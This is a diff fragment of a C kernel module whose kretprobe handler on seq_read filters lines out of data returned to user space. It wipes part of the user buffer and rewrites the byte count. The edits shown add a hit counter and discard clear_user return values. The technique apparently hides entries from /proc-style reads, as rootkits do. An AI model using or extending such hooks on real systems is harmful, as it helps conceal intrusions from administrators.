@@ -81,6 +81,8 @@ static int seq_read_ret_handler(struct kretprobe_instance *ri, struct pt_regs *r
     }
     kbuf[copied] = '\0';
 
+    atomic_inc(&nr_hit);
+
     filter_count = 0;
     line_start = kbuf;
     while (line_start < kbuf + copied) {
@@ -135,10 +137,13 @@ static int seq_read_ret_handler(struct kretprobe_instance *ri, struct pt_regs *r
                 kfree(kbuf);
                 return 0;
             }
-            if (new_size < copied)
-                clear_user(ubuf + new_size, copied - new_size);
+            if (new_size < copied) {
+                unsigned long __ret = clear_user(ubuf + new_size, copied - new_size);
+                (void)__ret;
+            }
         } else {
-            clear_user(ubuf, copied);
+            unsigned long __ret = clear_user(ubuf, copied);
+            (void)__ret;
         }
 
         regs->REG_RET = new_size;
